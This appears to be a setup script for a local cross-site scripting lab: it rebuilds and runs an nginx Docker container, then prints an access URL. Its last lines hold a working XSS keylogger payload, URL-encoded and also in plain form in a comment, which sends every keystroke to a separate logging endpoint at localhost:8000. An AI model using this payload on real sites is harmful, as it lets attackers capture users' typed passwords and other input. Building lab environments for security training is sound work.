#!/bin/bash

IMAGE="xss-nginx"
CONTAINER="xss-nginx-cyber"

# mapping the port where we'll open in our broswer e.g.
HOST_PORT=6969
CONTAINER_PORT=80

if [ "$(docker ps -a -q -f name=${CONTAINER})" ]; then
	echo ">>> Deleting previous created container: ${CONTAINER}"
	docker rm -f ${CONTAINER}
fi

echo "<<< Building Docker image!"
docker build --no-cache -t ${IMAGE} .

echo "<<< Running Docker container!"
docker run -d \
	-p ${HOST_PORT}:${CONTAINER_PORT} \
	--name ${CONTAINER} ${IMAGE}

echo ">>> Access to container: http://localhost:${HOST_PORT}"
echo "Access with the XXS: http://localhost:6969/?msg=document.addEventListener%28%27keydown%27%2Cfunction%28e%29%7Bfetch%28%27http%3A%2F%2Flocalhost%3A8000%2Flog%27%2C%7Bmethod%3A%27POST%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fjson%27%7D%2Cbody%3AJSON.stringify%28%7Bkey%3Ae.key%7D%29%7D%29%3B%7D%29%3B"
#echo ">>>> If you prefer to access with the XXS: http://localhost:${HOST_PORT}/?msg=document.addEventListener('keydown',function(e){fetch('http://localhost:8000/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({key:e.key})});});"
